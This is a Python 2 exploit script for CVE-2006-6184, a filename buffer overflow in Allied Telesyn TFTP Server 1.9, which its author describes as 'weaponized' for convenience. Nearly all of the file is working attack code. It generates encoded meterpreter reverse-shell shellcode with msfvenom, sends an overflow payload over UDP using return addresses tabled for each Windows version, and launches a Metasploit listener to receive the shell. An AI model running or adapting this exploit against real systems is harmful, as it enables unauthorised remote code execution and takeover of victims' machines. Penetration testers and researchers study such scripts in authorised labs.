#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#▄▄▄· ▄▄▄▄▄▄▄▄▄▄·▄▄▄▄▄▄▄▄ ▄▄▄·▄▄▄   ▄▄· ▄▄▄.                                                                #
#▐█ ▀█ •██  •██  ▐▄▄·•██  ▐█ ▄█▀▄ █·▐█ ▌▪▀▄.▀·                                                              #
#▄█▀▀█  ▐█.▪ ▐█.▪██▪  ▐█.▪ ██▀·▐▀▀▄ ██ ▄▄▐▀▀▪▄                                                              #
#▐█ ▪▐▌ ▐█▌· ▐█▌·██▌.▐█▌·▐█▪·•▐█•█▌▐███▌▐█▄▄▌                                                               #
#▀  ▀  ▀▀▀  ▀▀▀ ▀▀▀  ▀▀▀.▀.▀  ▀·▀▀▀  ▀▀▀                                                                    #
# attftp_rce - nighter                                                                                      #
#                                                                                                           #
# DATE                                                                                                      #
# 17/11/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Multiple stack-based buffer overflows in Allied Telesyn TFTP Server (AT-TFTP) 1.9, and possibly           #
# earlier, allow remote attackers to cause a denial of service (crash) or execute arbitrary code via a      #
# long filename in a (1) GET or (2) PUT command.                                                            #
#                                                                                                           #
# We weaponized the old exploit to make it more convinient                                                  #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################

import os
import sys
import socket
import time
import struct

from multiprocessing import Process

def build_shellcode():

    print("[+] Build shellcode")
    cmd = """msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=%s LPORT=%s -a x86 --platform windows -f raw -o /tmp/payload.bin 2>/dev/null""" % (LHOST, LPORT)
    os.system(cmd)

    cmd = '''perl -e 'print "\\x81\\xec\\xac\\x0d\\x00\\x00"' > /tmp/stackadj'''
    os.system(cmd)

    cmd = """cat /tmp/stackadj /tmp/payload.bin > /tmp/pre_shellcode.bin"""
    os.system(cmd)

    cmd = """cat /tmp/pre_shellcode.bin | msfvenom -p - -b \\x00 -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode.bin 2>/dev/null"""
    os.system(cmd)

    if os.path.isfile('/tmp/shellcode.bin') is False:
        print("[-] Generate shellcode failed")
        sys.exit(0)

def exploit():

    time.sleep(12)
    build_shellcode()
    fp = open('/tmp/shellcode.bin', 'rb')
    buf = fp.read()
    fp.close()
    os.unlink('/tmp/shellcode.bin')
    os.unlink('/tmp/payload.bin')
    os.unlink('/tmp/stackadj')

    tail = ""
    tail += "\x83\xc4\x28\xc3"
    tail += "\x00netascii\x00"

    (os_name, offset) = str(get_return_address()).split(',')
    ret = struct.pack('<L', int(offset, 16))
    print("[+] %s : %s" % (os_name, offset))

    #ret = "\xd3\xfe\x86\x7c"			# Return address (Little Endian)
    nops = "\x90" * (25-len(LHOST))
    payload = "\x00\x02" + nops + buf + ret + tail

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Declare a UDP socket

    try:
        print("\n[+] Exploit")
        s.sendto(payload, (HOST, int(PORT)))
    except:
        print("\n[-] Could not connect to " + HOST + ":" + str(PORT) + "!")

def get_return_address():

    return_address = {
		'1': 'Windows NT SP4 English,0x702ea6f7',
		'2': 'Windows 2000 SP0 English,0x750362c3',
		'3': 'Windows 2000 SP1 English,0x75031d85',
		'4': 'Windows 2000 SP2 English,0x7503431b',
		'5': 'Windows 2000 SP3 English,0x74fe1c5a',
		'6': 'Windows 2000 SP4 English,0x75031dce',
		'7': 'Windows XP SP0/1 English,0x71ab7bfb',
		'8': 'Windows XP SP2 English,0x71ab9372',
		'9': 'Windows XP SP3 English,0x7e429353',
		'10': 'Windows Server 2003,0x7c86fed3',
		'11': 'Windows Server 2003 SP2,0x7c86a01b'
	}

    try:
        return return_address[OS]
    except:
	    return return_address['10']


def start_listener():

    print("[+] Start listener")
    listener = "msfconsole -q -x 'use multi/handler;set PAYLOAD windows/meterpreter/reverse_nonx_tcp;set LHOST %s;set LPORT %s;run'" % (LHOST, LPORT)
    os.system(listener)


if __name__ == '__main__':

    if len(sys.argv) != 5:
        print ("""
 ▄▄▄· ▄▄▄▄▄▄▄▄▄▄·▄▄▄▄▄▄▄▄ ▄▄▄·▄▄▄   ▄▄· ▄▄▄ .
▐█ ▀█ •██  •██  ▐▄▄·•██  ▐█ ▄█▀▄ █·▐█ ▌▪▀▄.▀·
▄█▀▀█  ▐█.▪ ▐█.▪██▪  ▐█.▪ ██▀·▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐█ ▪▐▌ ▐█▌· ▐█▌·██▌. ▐█▌·▐█▪·•▐█•█▌▐███▌▐█▄▄▌
 ▀  ▀  ▀▀▀  ▀▀▀ ▀▀▀  ▀▀▀ .▀   .▀  ▀·▀▀▀  ▀▀▀ 
                                             
  *~ OFFSET ~*
  [1]  Windows NT SP4 English
  [2]  Windows 2000 SP0 English
  [3]  Windows 2000 SP1 English
  [4]  Windows 2000 SP2 English
  [5]  Windows 2000 SP3 English
  [6]  Windows 2000 SP4 English
  [7]  Windows XP SP0/1 English
  [8]  Windows XP SP2 English
  [9]  Windows XP SP3 English
  [10] Windows Server 2003
  [11] Windows Server 2003 SP2

[nighter@nighter.se] - Allied Telesyn TFTP Filename Remote Buffer Overflow (CVE-2006-6184) 
        """)

        print("Usage: %s <HOST>:[PORT] <LHOST> <LPORT> [1-11]" % (sys.argv[0]))
        print("\nEXAMPLE: ./atftp_rce.py '10.11.1.XX:69' 10.11.0.XX 443 11")
        sys.exit(0)

    HOST = sys.argv[1]
    if ':' in HOST:
        (HOST, PORT) = HOST.split(':')
    else:
        PORT = '69'

    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    OS = sys.argv[4]

    if os.path.isfile('/usr/bin/msfconsole') is False:
        print('[-] Please install metasploit for run this PoC.')
        sys.exit(1)

    p = Process(target=exploit)
    p.start()

    start_listener()
